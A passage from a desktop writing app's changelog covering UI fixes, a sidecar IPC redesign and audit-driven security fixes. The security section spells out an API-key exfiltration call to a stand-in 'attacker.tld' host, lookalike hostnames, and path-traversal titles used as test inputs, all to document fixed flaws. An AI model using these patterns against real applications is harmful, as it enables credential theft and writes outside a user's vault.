  `{{...}}` while the parser takes `{...}` (5.6).
- **Escape unwinds one layer at a time** — replace-confirm, then
  history, then the panel itself (5.7); click-outside already closed
  the mobile overlay.
- **Jargon removed from the AI panel**: "small slot" → "light model",
  ":8093" dropped, "Blank mode — no context injected" → "document
  context off", and an in-flight LLM start no longer blanks the button
  label (5.8).
- **"Thinking…" flips to "Generating"** once the first token lands,
  instead of sitting on "Thinking…" for the whole stream (5.9).
- **Chat history renders instantly** — rows show the date fallback
  while first-message previews resolve, instead of a bare "Loading…"
  over 30 sequential IPC calls (5.10).
- **New `arrow-down` icon** for the scroll-to-bottom button.

#### Reader, Home, StatusBar, auto-actions (Phase 6)
- **Reader gets a table of contents and live progress** (6.1): sections
  (already used for TTS) now power a Contents dropdown with click-to-jump
  and a live "% read" chip. Keyboard scrolling added (arrows, Page Up/Down,
  Home/End) with a focusable content area (6.2). The shelf filter empty
  state now tells the truth: "No books marked Reading" instead of the
  misleading "Your bookshelf is empty" (6.3).
- **Mark Finished gets confirm + undo** (6.4): the button now requires
  explicit confirmation, and a toast with "Undo" reverts the status back to
  reading. The `to-read`→`reading` flip on open is now wrapped in try/catch
  with a toast on failure.
- **Reader tabs re-read the document** (6.5): clicking a Reader tab now
  re-opens the book and restores the saved position instead of doing
  nothing.
- **ReaderProse seams removed** (6.6): fixed themes no longer render
  sections as separate cards with visible borders in sepia/dark modes.
- **HomePane gets a New Document CTA** (6.7): the empty state now shows a
  "New Document" button that creates and opens a doc in one click.
- **Home tasks get undo** (6.8): completing a task shows a toast with an
  "Undo" button instead of vanishing silently.
- **StatusBar becomes clickable** (6.9): word count, streak, and stats
  items open the stats panel; the workspace label switches to Write on
  click. Stats refresh debounced to 800ms to avoid hammering the API.
- **Skill Nudges tamed** (6.10): new `skillNudgesEnabled` setting in
  Settings → Tips toggles the strip globally; dismissing a nudge no longer
  auto-advances to the next; the message text is clickable and opens the
  relevant feature; the strip is hidden in Zen mode.
- **Plugin Manager relabeled as roadmap** (6.11): a notice banner now
  explains the panel is a preview of planned integrations; toggles and
  installs are not yet functional.
- **Smart suggestions get reasons, dismiss, and refresh** (6.12): each
  "Pick Up Where You Left Off" card now shows why it was suggested (e.g.,
  "Based on your activity in Novel Studio"), has a dismiss button, and the
  section has a refresh button to regenerate suggestions.

### sidecar slice 4: zero TCP ports + single-flight ensure

Continuation of the user-approved sidecar lifecycle redesign (2026-10-09).
Verified: `cargo check` clean, `cargo test --lib` 132 passed (1 ignored),
svelte-check 0/0, all three prebuilt exes rebuilt (`build_sidecars.py`) and
smoke-tested over real pipes, no TCP listeners on 8090–8093.

#### Changed
- **No sidecar binds a TCP port anymore.** STT/TTS/memory speak
  newline-delimited JSON over their own stdin/stdout pipes
  (`IpcSidecar`, `src-tauri/src/ipc.rs`): request `{"id","method","params"}`
  → response `{"id","ok",result|error}`; a reader thread routes responses
  to per-request oneshot channels by id, so concurrent calls are safe and
  a dead child fails every pending call instead of hanging it. The LLM
  (llama-server) binds an AF_UNIX `.sock` (`--host <path>.sock`); a
  hand-rolled HTTP/1.1 client (`SockClient`) speaks over that socket
  (non-streaming — covers /health, /completion, /v1/chat/completions,
  /v1/models; ws2_32 FFI for AF_UNIX on Windows, TcpStream-wrapped).
  Sentinel endpoint values (`http://127.0.0.1:8093/v1`,
  `http://localhost:8093/v1`) — the existing `smallModelEndpoint` default —
  now redirect server-side to the sock client in `ai_generate`,
  `ai_generate_stream` (single chunk; SSE-over-sock deferred),
  `ai_structurize`, and `provider_probe` (invoke signatures unchanged).
  Python server argv contract (app+exe ship together): stt `[model?]`,
  tts `[model_dir?]`, memory `[data_dir]`; env token contract unchanged
  (`JWE_SIDECAR_TOKEN`/`JWE_MEMORY_TOKEN` — pipe is private, but the
  contract keeps script/exe builds interchangeable). Deleted: port
  reclaim/port_owner/kill_port_owner/netstat/tasklist machinery,
  `stt_port`/`tts_port`/`llm_port` Tauri commands, and the frontend port
  wrappers (`api.ts` `sttPort`/`ttsPort`/`llmPort`, matching
  `browserBackend.ts` cases). Timeout constants (sidecar.rs): health 120s,
  media 180s, control 30s. `LlmManager` computes a fresh
  `jwe-llm-<uuid>.sock` under the temp dir, unlinked before spawn and on
  stop. One known non-regression: the onefile `stt-server.exe` smoke
  reports a missing transcribe engine (PyInstaller native-lib gap —
  pre-existing; frame round-trip works, script+venv Python loads the
  model fine).
- **`ensureSidecar` is single-flight and never kills a slow model**
  (slice E). Concurrent taps (mic hover + click, Ghost + Settings test)
  now share one in-flight ensure per sidecar kind instead of racing two
  starts; `fail()` no longer calls `spec.stop()` — a model that exceeded
  the 15s health poll keeps loading, and the next ensure reuses the live
  process via `isRunning()` + a fresh poll. The timeout message now says
  the sidecar "is still starting" rather than implying it was torn down.
- **Warm-on-intent** (slice B). Hovering the mic button for ~120ms
  pre-warms Moonshine STT (`warmStt`); hovering the read-aloud button
  pre-warms Kokoro TTS and does a silent first synthesis of `"."` so the
  ONNX voice model is already loaded before the first real utterance
  (`warmTts`, both in `audio.ts`). Wired via `onpointerenter`/`onpointerleave`
  with a 120ms dwell timer (cancelled on `onpointerleave` and `onDestroy`)
  in `MicButton.svelte` and `ReadAloudButton.svelte`; no-op in
  browser-preview mode. Turning Ghost on (with `llmEnabled`) fires
  `warmLlm()` via an `$effect` in `JustWriteWorkspace.svelte` — single-flight
  inside `ensureLlm` prevents a double start if `ghost.ts` already kicked
  one off. No boot pre-warm; cold boot stays silent.
- **Idle offload** (slice D). New `modelRetention` setting (`idle-5min`
  default / `session` = 30-min idle / `always` = never). `audio.ts` tracks
  last-used timestamps per sidecar (marked on ensure-success and on
  `transcribeAudio`/`synthesizeText`); a 30s interval watcher offloads
  STT/TTS/LLM past the idle threshold — skips STT while recording or
  transcribing, TTS while playing. `always` never offloads until the user
  stops the sidecar or the app exits. SettingsPane select under Local LLM.
- **"Browser voice" status badge** (slice F). In web preview (no Tauri
  sidecars), the StatusBar now shows a warning-colored "Browser voice"
  chip with a mic icon — voice features use the browser's Web Speech /
  speechSynthesis APIs instead of local models. The underlying browser
  dictation and read-aloud fallbacks in `MicButton`/`ReadAloudButton`
  already existed; this makes the   mode visible instead of tooltip-only.
- **No line-number gutter in writing views.** `EditorPane.svelte` and
  `MarkdownViewer.svelte` drop their explicit `lineNumbers()` (plus
  EditorPane's dead `basicSetup` import); `JustWriteWorkspace.svelte`
  keeps `basicSetup` for its keymaps/history/search and hides the strip
  via `.cm-gutters { display: none }` in the shared theme, covering main
  and split editors. Dead gutter CSS removed (EditorPane theme rules +
  reading/focus-mode selectors, MarkdownViewer border rule). Word count
  stays in the StatusBar.

#### Fixed
- **`stop_reaps_child` flake under parallel test load.** `terminate_child`
  (`procutil.rs`) now treats "taskkill failed but child already exited" as
  success — Windows taskkill races (exit 255/128) when the process dies
  between spawn and taskkill's PID lookup. Previously this surfaced as a
  spurious `Err` in `ManagedSidecar::stop`.

#### Added
- `IpcSidecar` + `SockClient` unit tests (`ipc.rs`): request-without-start
  errors, dechunk reassembly.

#### Removed
- **PIN / app-lock subsystem (full scope, user-directed 2026-10-09).** The
  app-launch PIN gate and per-document locking are gone. Frontend: deleted
  `lock.ts` + `LockScreen.svelte`; dropped every lock branch from `App.svelte`,
  `WidgetApp.svelte`, `TabBar`, `SettingsPane`, `HomePane`, `InboxWorkspace`,
  `transclude`, `WikilinkPreview`, `SkillNudges`, `SkillsPage`, `AiPanel`,
  `EditorPane`, `JustWriteWorkspace`, `storyMemory`, `widgetBridge`,
  `settings.ts`, `settingsValidate.ts`, `api.ts`, `browserStore.ts`,
  `browserBackend.ts`. Backend: removed `app_lock_configured`/`_verify`/`_reset`,
  `verify_pin_value`, `doc_set_locked`, `widget_doc_unlocked`; `docs.locked`
  column dropped from the fresh schema (existing DBs keep the column harmlessly
  — no destructive migration) and from `Doc.locked`. Removed the locked-doc
  filters across `search.rs`, `rag.rs`, `snapshots.rs`, `bible.rs`,
  `doc_store.rs`. Orphaned generated ACL artifacts deleted
  (`permissions/autogenerated/app_lock_*.toml`, `doc_set_locked.toml`) and the
  stale grants stripped from `main.toml`/`widget.toml`. Orphaned keychain
  entry `appLockPin` remains in users' keychains until manually cleared.
  Verified: `cargo test --lib` 132 passed, `svelte-check` 0/0, e2e/memory
  stdio block green.

### sidecar slice 4, part G: spawn fix

First slice of the user-approved sidecar lifecycle redesign (2026-10-09):
kill the "start every sidecar" dead end, kill console flashes. Verified
`cargo check` clean, `cargo test --lib` 134 passed (3 new), `svelte-check` 0/0.

#### Fixed
- **Every dev-side sidecar start failed closed.** The frontend resolved the
  sidecars dir as `<resourceDir>/sidecars`, but in dev runs Tauri never
  copies sidecars there — the path didn't exist, so `require_sidecar_paths`
  refused ALL STT/TTS/memory/LLM starts while the same exes worked when
  spawned by hand. New single source of truth: Rust `sidecars_dir` command
  (`commands.rs`) tries packaged resource dir → beside the exe → source
  checkout (`CARGO_MANIFEST_DIR/sidecars`), each candidate trust-checked
  (`trusted_sidecars_dir`) and content-checked (`memory_server.py` or
  `bin/memory-server.exe`), and errors list every tried path.
  `getSidecarsDir()` (`audio.ts`) is now one invoke; browser preview keeps
  the dev-path string. Covered by 3 unit tests
  (`sidecars_dir_resolves_source_checkout_without_resource_dir`,
  `_missing_resource_candidate_falls_through`,
  `_reports_searched_paths_when_all_candidates_fail`).
- **Console windows flashed on every helper spawn.** No `CREATE_NO_WINDOW`
  anywhere in `src-tauri/src`: python probe, typst probe/compile, taskkill,
  and the sidecar servers themselves each popped a console. New
  `procutil::hide_console` (`creation_flags(0x08000000)`) applied at every
  surviving console spawn; GUI launches (explorer/open/xdg-open) untouched.
  netstat/tasklist port-reclaim sites left as-is — that whole path is
  deleted by the upcoming no-port transport swap.

### audit pass: UTF-8 panics, vault confinement, locked-doc leak

Found by a four-lens repo audit; each critical claim re-verified against source
before fixing. Frontend changes are verified (`svelte-check` 0/0, `test:source` exit 0).
**The Rust changes in this section are not yet compiled or tested** — see Verification.

#### Fixed
- **Panic on any non-ASCII title.** `sanitize_filename` guarded with `result.len() > 64`
  (bytes) then called `String::truncate(64)`, which panics when byte 64 lands inside a
  multi-byte character. 22 CJK chars is 66 bytes, so a Novel Studio / Projects / Script
  title in Chinese, an em-dash, or an emoji aborted the whole `doc_create` invoke.
  Tauri has no `catch_unwind`, so the panic unwound into a Tokio task and **the JS promise
  never settled** — no error toast, the dialog spinning forever. The failure mode was
  "working-looking but broken", not a visible crash.
- **Same panic in three AI-context snippets.** `get_workspace_context` sliced
  `&doc.1[..500]`, `&prev.1[..300.min(len)]` and `&content[..200.min(len)]`. The `.min(len)`
  form only *looks* safe: inside `if len > n` the `min` always collapses to `n`, so all
  three panicked identically. Now one `snippet_of` helper, and the drifted copies are
  gone. (This corrects an audit claim that two of the three were safe — they were not.)
- **Arbitrary file write outside the vault.** `create_doc` was the only write path in
  `doc_store.rs` that did not route through `resolve_in_vault` (save, delete, move,
  restore and atomic_save all did). Because `PathBuf::join` *replaces* the accumulated path
  when handed an absolute segment, and the `logs` branch split an unsanitised title on `-`
  to build directories, a title like `AAAAAAAAAA-C:\evil-x` relocated the write out of the
  vault entirely. `QuickCaptureOverlay.svelte` sets `title = body.slice(0, 80)` from typed
  text and offers `logs` as a target, so this was reachable from ordinary UI. `create_doc`
  now confines the path, and every `logs` segment goes through `sanitize_component`.
- **Daily-note date accepted unchecked.** `log_get_or_create` fed the renderer-supplied
  date straight into the title *and* the path. Now gated on a strict ASCII `YYYY-MM-DD`.
- **Locked-document leak via snapshots.** `snapshot_list` returned full snapshot bodies
  with no `docs.locked` filter, while twelve sibling read paths all filter — and
  `allow-snapshot-list` is granted to the companion window, so it silently defeated the
  widget ACL's own "locked docs stay out of the companion" guarantee. Now filtered.
  `snapshot_restore` is main-window-only and left alone deliberately: refusing it would
  block an owner restoring their own locked doc's history.
- **Boot sequence could reproduce the ghost window.** `App.svelte`'s boot IIFE had a
  `finally` that cleared the failsafe but no `catch`, so a synchronous throw would skip
  `ready = true` and `revealMainWindow()` *and* disarm the 20 s failsafe. Added a `catch`
  that shows the shell and a warning banner.
- **The boot gate skipped the companion window.** `WidgetApp` had no gate at all, so it
  still raced `setup`; its first `prepareWorkspace` could fail with
  `state not managed for field 'db'`, and because that error is rendered as
  `prepareError` with no retry, the widget displayed a raw Rust internal message. The
  widget now waits on the same gate. A comment in `App.svelte` had claimed the gate fixed
  the widget — it did not, and now says so accurately.
- **`app_boot_ready` missing from the browser preview.** `browserBackend.ts` had no case,
  so `api.appBootReady()` resolved `false` and the gate burned its entire 8 s budget on
  every preview load. Mirrored to `true` (no Rust `setup` to race in the preview).

#### Removed
- `src/lib/components/SyncManager.svelte` — 275 lines, compiled into every bundle, never
  mounted, and absent from `BODY.md`. The exact "built but silently unwired" failure
  Body-anatomy exists to catch.

#### Fixed (credential exfiltration + arbitrary read)
- **`provider_probe` was a renderer-directed exfiltration primitive.** The endpoint *and*
  the API key both came from the renderer, and the code explicitly declined private-IP
  gating. Since `secret_get("apiKey")` returns the stored key, a compromised webview could
  call `secret_get("apiKey")` then `provider_probe("https://attacker.tld", key)` and read
  the key straight back out of the response. The key is now attached **only** to a
  hardcoded `KEY_BEARING_HOSTS` list (the five providers the app ships with) or to a
  private IP literal / `localhost` — self-hosted and LAN providers keep working, and any
  other host is still probed, just unauthenticated, with the withholding logged rather
  than implied to have been verified. The allowlist is a Rust constant, **not** derived
  from settings: settings live in localStorage, so a compromised renderer could otherwise
  widen the list it is checked against. `localhost.attacker.tld` and
  `api.anthropic.com.attacker.tld` are rejected; `0177.0.0.1`-style leading-zero octets
  are rejected even though `parse()` accepts them.
- **`open_external_file` was an arbitrary read of any `.txt`/`.md` on the machine.** It
  took a renderer-supplied path with only extension, 25 MB and NUL-byte checks — no vault
  confinement, unlike every `fs_*` command. It now takes **no path at all**: the backend
  opens the file it recorded in `PendingLaunchFile` from argv / the OS file association.
  There was no legitimate caller that supplied a path (`nativeLaunch.ts` always fed it the
  backend's own pending file), so the parameter is gone rather than merely validated.

#### Fixed (sidecar authentication)
- **STT, TTS and LLM loopback sidecars had no authentication at all.** Only the memory
  sidecar minted a per-launch token (`JWE_MEMORY_TOKEN` / `X-JWE-Memory-Token`); the other
  three accepted any caller. Loopback is not a trust boundary — any process running as any
  local Windows account can reach `127.0.0.1`, and any website in any browser can issue a
  **bodyless POST**, which is a CORS-simple request needing no preflight, to drive
  transcription or synthesis on this machine. All three now take a per-launch
  `JWE_SIDECAR_TOKEN` / `X-JWE-Sidecar-Token`, minted as a UUIDv4 per manager and sent on
  **every** request (5/5 STT, 3/3 TTS, 3/3 LLM request builders).
- **`stt_server.py` / `tts_server.py` now enforce the token** with `hmac.compare_digest` on
  both `do_GET` and `do_POST`, and **refuse to start at all** without it — so they cannot
  fall back to being an open endpoint if the launcher ever forgets to pass one.
- **`llama-server` now runs with `--api-key`.** Load-bearing: llama.cpp's HTTP server
  defaults to permissive CORS, so without it a site the user visited could POST prompts to
  the local model *and read the completions back cross-origin* — persistent free inference
  plus a cross-origin exfiltration sink. (`--host 127.0.0.1` limited reach to this machine;
  the key limits it to this app.)
- **`connect-src` no longer wildcards every loopback port.** `http://127.0.0.1:*` and
  `http://localhost:*` granted any JS in the webview reachability to *every other listener
  on the machine*. Replaced with the four sidecar ports named explicitly; every sidecar call
  is already proxied through Rust, so the webview needed no loopback access at all. The
  cloud AI providers and place-stamp hosts are untouched, and the **retired** Ollama
  endpoint (`localhost:11434`, `RETIRED_MAIN_ENDPOINT` in `settingsValidate.ts`) is
  deliberately *not* re-allowed.

#### Changed
- **CodeMirror removed from the startup critical path: 1065 KB → 349 KB (-67%),
  16 chunks → 8.** `App.svelte` statically imported `EditorPane`, and because a
  static import's whole dependency closure must resolve before the importing
  module body runs, ~1 MB had to download and parse before `mount()` could start
  the BootLoader — so the progress UI could not paint during the largest part of
  boot. `EditorPane`, `Logs`, `JustWrite` and `Inbox` are now code-split through
  the existing `LazyWorkspace`.
  All four had to move **together**, which is the part worth recording: each
  reaches CodeMirror independently (`EditorPane` directly, `Logs` via its own
  `EditorPane` instance, `JustWrite` via `ghostWidget`, `Inbox` via `DocDetail`),
  so splitting any one of them left the chunk statically reachable and bought
  nothing. The first attempt did exactly that — it removed one import edge,
  moved the measured critical path by 0 KB, and would have added a "Loading…"
  flash on the app's primary surface for no gain, so it was reverted.
  Measured by walking the static-import closure of the entry chunk in `dist/`.
  CodeMirror is now reachable only from lazy chunks (`EditorPane`, `AiPanel`,
  `ghost`, `editorFocus`), which load on first use. `test:smoke` shell-interactive
  time at 1280 px improved from ~572 ms to ~518 ms.

#### Fixed (correctness + performance, round 2)
- **`fs_read_file` had no size cap** while `fs_write_file`, `attachment_save` and
  `open_external_file` all refused anything over 25 MB — so one path could force an arbitrarily
  large allocation inside the vault. The limit is now a named `MAX_TEXT_BYTES` constant shared
  by all four sites instead of a magic number repeated four times.
- **`docs.locked` was not filtered in three read paths** — `list_docs_by_workspace`,
  `log_list_entries` and `graph_query` (both its workspace-scoped and unfiltered branches)
  returned full `Doc` rows, content included, for locked documents. The app-lock guarantee was
  implemented per-query and these three were the gaps. A new test asserts the *unlocked* docs
  still appear, so the filter cannot be over-broad.
- **`browserBackend.ts` had drifted from Rust in ways a user can see.** Exporting the same
  manuscript from the preview and the desktop produced different files:
  - **`![[embed]]` inlining was missing entirely**, despite the function's own doc comment
    claiming it. `previewInlineEmbeds` now mirrors `convert.rs::inline_embeds`, including the
    `> [embed missing: …]` marker.
  - **`slugify` dropped non-ASCII.** Rust uses the Unicode-aware `is_alphanumeric`, so
    `Café` → `café`; the mirror's `[^a-z0-9]+` gave `caf`. Now uses `\p{L}\p{N}`.
  - **`markdownToText` stripped one heading level**, where Rust's
    `trim_start_matches(['#','>',' ','\t'])` strips all of them — so `## Chapter` became
    `Chapter` on the desktop and `# Chapter` in the preview.
  - **Pass ordering.** Rust runs `inline_embeds` then `resolve_wikilinks` as two passes, so a
    `[[wikilink]]` inside an embedded note gets resolved; a single combined regex pass cannot,
    because a replacement is never rescanned. The preview now runs the same two passes, and its
    `resolveWikilinks` leaves `![[` markers alone exactly as Rust does ("inline_embeds handles
    it") instead of duplicating that logic.
  - **The PIN backoff constants did *not* diverge.** The audit reported them as a fourth
    divergence; they are identical (2000 / 60000 / 5). The parity test now asserts that rather
    than leaving it as folklore — verified, not assumed.

#### Performance
- **`VACUUM INTO` no longer holds the app's only DB connection.** `backup_create` copied the
  whole database while holding the single connection's mutex, stalling every concurrent
  command (autosave, search, RAG) for the duration — and it ran on the boot path. It now runs on
  a second connection (WAL permits a reader alongside the writer) when the backing file is known,
  recorded via a new `Database::with_db_path`. In-memory test databases keep the locked path,
  since there is no file to reopen.
- **`backupCreate` no longer gates boot.** It was `await`ed inside the startup sequence, so the
  tab restore deciding which document the user lands on waited behind a whole-file copy. Now
  fired without `await`.
- **Four SQLite pragmas added.** Only `journal_mode` was set, so the rest ran at defaults that
  cost real time here: `synchronous` defaulted to FULL, meaning **every commit fsynced the WAL**
  while the editor autosaves on each pause — the most frequent disk sync in the product. Now
  `synchronous=NORMAL` (the standard WAL companion: still crash-safe against application
  crashes, and the app already has snapshots and version history), plus `cache_size=-20000`
  (~20 MB against a ~2 MB default, with repeated scans re-reading from disk),
  `mmap_size=256 MB`, and `temp_store=MEMORY`.
- **RAG retrieval N+1 removed.** `rag_search` issued one `query_row` per semantic hit (default
  10), each walking the b-tree again, with the connection mutex held throughout. Now a single
  `IN (…)` statement with the per-hit distance re-attached; ordering and scoring unchanged.

#### Tests
- `tests/backend-parity.mjs` (`npm run test:parity`) — pins the TypeScript mirror to the
  **Rust** contract (Rust owns publishing/export) across `slugify`, `markdownToText`, the embed
  step, pass ordering, display-text selection and the PIN constants. Falsifiable: it fails
  against the pre-fix mirror, because `previewInlineEmbeds` did not exist.
- `doc_store::rag_search_returns_content_and_honours_locked_docs` — guards the batched chunk
  fetch: results still carry real content and finite scores, locked docs stay excluded, and
  open docs are not over-filtered. It also records that `create_doc` does not chunk, so the test
  builds the index the way the app does.
- `tests/renderer-path-guard.mjs` (`npm run test:pathguard`) — asserts
  `open_external_file` takes no renderer path and reads `PendingLaunchFile`, that no caller
  passes one, that `create_doc` still routes through `resolve_in_vault`, and that the
  `provider_probe` key allowlist stays hardcoded rather than settings-derived. Proven
  falsifiable: **9 checks fail** against the pre-fix sources.
- `tests/sidecar-auth.mjs` (`npm run test:sidecarauth`) — 36 checks, and the Python half
  is **executed**, not asserted: both servers are booted for real and probed. Unauthenticated
  GET → 401, wrong token → 401, correct token → 200, and an unauthenticated bodyless POST
  (the request a website can send blind) → 401. Each server is also started *without* the
  env var and asserted to **exit** rather than serve. The Rust half is checked statically:
  each manager holds and mints a UUID token, passes it to the child, and the count of
  `.header(TOKEN_HEADER, …)` call sites equals the count of request builders. Proven
  falsifiable — neutralising the TTS comparison makes it report `200` where `401` is
  required (4 failures).
- `tests/csp-desktop.mjs` extended to pin the four sidecar ports explicitly, assert **no**
  wildcard loopback range survives, assert the retired Ollama endpoint stays out, and assert
  every cloud provider host is still reachable — so the narrowing cannot be redone into a
  silent AI outage.
- `doc_store.rs`: `truncate_bytes_safe_never_splits_a_character` (asserts every returned
  index is a char boundary and a prefix, across CJK/em-dash/emoji seams at 9 cut points),
  `sanitize_filename_survives_multibyte_titles`, `snippet_of_never_panics_on_multibyte_bodies`,
  `iso_date_gate_accepts_only_yyyy_mm_dd`, `log_get_or_create_rejects_a_non_iso_date`,
  `logs_titles_cannot_escape_the_vault`, and `create_doc_confines_the_path_it_writes`.
  Every input in these aborted the corresponding invoke before the fix.
- `tests/acl-parity.mjs` extended to the **fourth** list (`api.ts` → `browserBackend`),
  which is what let `app_boot_ready` ship unmirrored. Its own command-matching regex had
  the same blind spot as the e2e guard it was modelled on: `safeInvoke<[^>]+>` misses every
  nested generic, hiding 4 commands, and a fixed-width window missed calls with long
  inline object types. Now anchored on the real `>("name")` call with a lazy generic —
  176 measured, matching the 177 `safeInvoke` mentions minus the one definition.
  `ai_generate_stream` is an enumerated, comment-justified exemption (streaming cannot be
  mirrored into localStorage), not an open-ended allowance.

#### Verification
- `npm run check`: 0 errors, 0 warnings. `npm run test:source`: exit 0.
- `npm run test:smoke` (1280 / 390 / 390-dirty): all PASS, **0 console errors and
  0 warnings** in every viewport. `npm run test:e2e`: all checks passed, exit 0
  (including the lazy-shell timeout/retry and label contracts). `npm run test:tabs`
  and `test:shell`: exit 0 — run specifically because four workspaces now mount
  through `LazyWorkspace`.
- `tests/acl-parity.mjs`: 177/177 across lib.rs, build.rs and permissions, 176/176 mirrored
  into `browserBackend.ts`.
- The `provider_probe` key-allowlist **algorithm** was separately verified by porting it to
  JS and running all 32 vectors (withheld from public and lookalike hosts, sent to the five
  providers case-insensitively, sent to local/LAN including IPv6 loopback, and every
  IP-spoof case). That caught a real bug: `[::1]` was denied until bracket stripping was
  added, which would have broken key-auth to a local vLLM bound to IPv6 loopback.
- **Rust compiles and its tests pass: `cargo check` clean, `cargo test --lib` 64 passed /
  0 failed.** This covers every Rust change in this batch — the UTF-8 helpers, vault
  confinement, `is_iso_date`, the `snapshot_list` lock filter, all three sidecar token
  managers, `provider_probe`, and `open_external_file`.
  `cargo check` immediately earned its keep: it caught **3 real errors in new code** that
  inspection had missed — `collect()` from an iterator of `Option<u32>` into
  `Option<Vec<u32>>` has no `FromIterator` impl, leaving the binding an `Option` and
  failing the two indexings after it. Rewritten to validate each octet explicitly, which
  also tightened the check (a `parse` that had accepted `+1`/`-1`/leading spaces now
  cannot).
- **The new tests are falsifiable, and two of them were not until this was checked.**
  Reintroducing the three original bugs makes all six `doc_store` security tests fail, each
  panicking at its own assertion. The first attempt at that check appeared to pass — for
  two reasons worth recording:
  1. `cargo test` had silently **not rebuilt**: restoring the file with `Copy-Item`
     preserved the backup's older mtime, so cargo re-ran the *buggy* binary and reported
     failures against correct source. Fixed by touching the file after every restore.
  2. The path-confinement tests were **lexically unsound**. `Path::starts_with` compares
     components from the left, so an escaping path like `<vault>/logs/../../../x.md` still
     satisfies `starts_with(<vault>/logs)` — the first components genuinely do match. The
     original titles were worse: `"AAAAAAAAAA-C:\evil-x"` has a single dash-separated
     segment before byte 10, so it fell into the id-based branch *even with the bug
     reintroduced*. Both tests now normalise with `normalize_lexically` first, and the
     traversing input is pinned separately (`..-..-..-x`) as the only shape that reaches
     the `parts.len() >= 3` directory join.

#### Known-open (from the same audit, not yet addressed)
- `doc_store.rs` is ~4500 lines; `database.rs`, `models.rs` and `lib.rs` still have **no**
    tests of their own. 21 of 280 `api` methods have no callers, each dragging ~4 parallel
    list entries with it (`scriptTimeline*` is a fully-wired dead feature). `BODY.md`
    documents 36 components; 71 exist, and it attributes `generate_handler!` to the wrong
    file. A structural split of `doc_store` and a regenerated BODY map are the remaining
    maintenance work; neither is a user-visible bug.
  - `search_docs` uses `LIKE '%q%'`, which cannot use `idx_docs_title`/`idx_docs_path` and so
    scans the table. `search_docs_fts` (FTS5 + bm25) already exists and is what the command
    palette uses. Routing `doc_search_full` to FTS is a **product** decision, not a pure
    optimisation: FTS is token-based, so it would change substring-search behaviour that
    partial-word lookups currently rely on.
  - `idx_rag_chunks_content` indexes the full chunk text, but every caller searches it with a
    leading `%`, which no B-tree can serve — so it is never read while still taxing every
    chunk insert. Dropping it (and adding a `rag_chunks_fts` table for the keyword fallback,
    which currently scans all chunk text) is the correct follow-up to the N+1 fix above.
  - `perf_benchmark`'s "search latency" probe measures an unindexed `LIKE` pattern no user path
    uses, while holding the sole connection mutex for 10 consecutive scans — so the number in
    Settings → About describes something the app deliberately avoids, and pressing the button
    stalls concurrent work.

### desktop shell: ghost window, boot race, ACL parity

#### Fixed
- **Ghost window — service worker bricked the embedded shell.** `public/sw.js` used a
  hardcoded cache name (`just-write-ehis-v2`) that was never bumped, and its `fetch`
  handler was cache-first for same-origin GETs including the HTML document. After an
  update it kept serving a cached `index.html` naming content-hashed chunks the new
  build no longer shipped; the entry module then loaded as `text/html` and never
  executed. `#app` stayed empty, `showMainWindow()` never ran, so the hidden main
  window was never revealed — and with no frontend there was no IPC at all, which is
  why AI, STT/TTS/LLM, memory, pandoc and the widget were all dead at the same time.
  Registration is now gated to the web/Android PWA path (`index.html`), where the cache
  has a purpose; inside Tauri the page actively unregisters any pre-existing worker and
  drops caches, which is what heals an install a previous build already poisoned (an
  active worker keeps controlling the page until it is removed). `sw.js` also carries a
  versioned cache name, purges non-current caches on `activate`, and serves documents
  network-first with the cache as the offline fallback — hashed `/assets/` stay
  cache-first, which is safe because they are content-addressed.
- **Ghost window — release builds targeted the dev server.** `Cargo.toml` was missing
  the mandatory `custom-protocol` feature, so `tauri-build` always set `cfg(dev)`: any
  `cargo build --release` produced a binary that loaded `http://localhost:5173` instead
  of the embedded assets. With no dev server running the webview never loaded and the
  same ghost window resulted. The feature is restored and documented in place.
- **Boot race against the Rust backend.** Tauri creates the configured windows and
  starts their webviews *before* `setup()` returns, so the frontend mounted and issued
  commands while the database and sidecar managers were still unmanaged. Those calls
  failed with `state not managed for field 'db'` and, because the boot steps do not
  retry, stayed dead for the session: file watcher, Home dashboard, status-bar stats,
  inbox triage banner, streak nudge, and the companion widget's document commands.
  `commands::BootReady` is now managed as the first statement of `setup` and flipped
  as the last, and the frontend waits on `app_boot_ready` (`src/lib/bootGate.ts`) before
  running any boot step. The gate fails open: a backend that never reports ready still
  boots.
- **False "boot step timed out" warning.** `bootStep` treated `result === null` as a
  timeout, but commands returning `Result<(), String>` (e.g. `setup_file_watcher`)
  serialise their `Ok` payload to `null` — so successful steps were reported as timed
  out and polluted the slow-steps boot diagnostic. The timeout now uses a sentinel.
- **Desktop CSP blocked the app's own fonts.** `font-src 'self'` rejected the `data:`
  URIs that Vite emits for any woff2 under 8 KB — the small `latin-ext`/`cyrillic`
  subsets. 12 inlined font faces in the current bundle were refused, producing a console
  error per face on every boot and silent fallback to a system font for those glyphs, in
  an app built around typography. `img-src` and `media-src` already allowed `data:`/`blob:`;
  `font-src` now allows `data:`. The browser build has no CSP, which is why
  `npm run test:smoke`'s zero-console-error bar never caught it.

#### Added
- `tests/ghost-window-guard.mjs` (`npm run test:ghostwindow`) — asserts the desktop
  shell can never register a service worker, that the worker is versioned and
  network-first for documents, and that the Tauri branch unregisters and clears caches.
- `tests/boot-gate-unit.mjs` (`npm run test:bootgate`) — the gate's recovery from
  early `not-managed` rejections, its fail-open behaviour, and its timeout budget.
- `tests/acl-parity.mjs` (`npm run test:aclparity`) — checks the three hand-maintained
  ACL lists agree: `generate_handler!` in `lib.rs`, `COMMANDS` in `build.rs`, and the
  `allow-*` grants in `permissions/*.toml`. A command registered but not granted fails
  only at runtime with `Command X not allowed by ACL`, which is how the boot gate
  shipped denied; forgetting `build.rs` fails the build. Both directions are now named
  failures.
- `tests/csp-desktop.mjs` (`npm run test:csp`) — asserts the desktop CSP allows what the
  built bundle actually uses (cross-checked against `dist/assets/*.css`), while pinning
  `script-src` free of `unsafe-inline`/`unsafe-eval`, `object-src 'none'`, and
  `base-uri 'self'` so the fix cannot be made by blanket loosening.
- `app_boot_ready` command plus `api.appBootReady()`, granted to the main window.

#### Verification
- Confirmed against a running release binary before `src-tauri/target` was cleared:
  main window `visible: true` with title `Just Write ehis`; frontend interactive;
  zero service-worker registrations and zero caches in the desktop shell; TTS `ok` on
  8091 with the Kokoro bundle resolved; LLM `ok` on 8093; `convert_status` reporting
  pandoc with all six formats; companion widget window rendering.
- Reproduced the original failure first: stale `index.html` requesting a chunk absent
  from the new build, entry module rejected for `text/html`, `#app` with 0 children,
  and `EnumWindows` reporting the correctly-sized main window as `Visible = False`.
- `tests/ghost-window-guard.mjs` was run against the pre-fix sources and fails 9 checks
  there, so it genuinely detects the regression it guards.
